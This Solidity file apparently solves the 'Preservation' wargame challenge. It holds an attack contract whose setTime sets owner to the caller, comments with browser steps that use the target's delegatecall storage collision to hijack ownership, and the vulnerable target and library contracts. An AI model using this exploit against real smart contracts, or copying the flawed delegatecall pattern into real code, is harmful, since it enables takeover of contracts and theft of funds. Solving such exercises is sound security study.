pragma solidity ^0.8.0;

contract PreservationPwn {

  // deployed contract addres = 0x34bCbD45488E8C7bad3fbA3b1395D54A4F803CBc
  // Uint version = 301076547978132403828554724906968488439560813756

  // call await contract.setFirstTime("301076547978132403828554724906968488439560813756"); in the browser to change the value in slot 1 of the preservation contract to this contract

  // now all we need to do is call the setFirstTime function a second time, and this time it will call our malicious version instead, which will change the owner

  // need to have the same storage layout as the Preservation contract
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner; 
  uint storedTime;
  // Sets the function signature for delegatecall
  bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

  // empty constructor
  constructor() { }

  // attack function, needs same name and format as the library function so that the delegate call will behave the same
  function setTime(uint _time) public {
      owner = msg.sender; // when called from the Preservation context we can change the owner slot because we laid them out the same
  }

}

contract Preservation {

  // public library contracts 
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner; 
  uint storedTime;
  // Sets the function signature for delegatecall
  bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {
    timeZone1Library = _timeZone1LibraryAddress; 
    timeZone2Library = _timeZone2LibraryAddress; 
    owner = msg.sender;
  }
 
  // set the time for timezone 1
  function setFirstTime(uint _timeStamp) public {
    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }

  // set the time for timezone 2
  function setSecondTime(uint _timeStamp) public {
    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }
}

// Simple library contract to set the time
contract LibraryContract {

  // stores a timestamp 
  uint storedTime;  

  function setTime(uint _time) public {
    storedTime = _time;
  }
}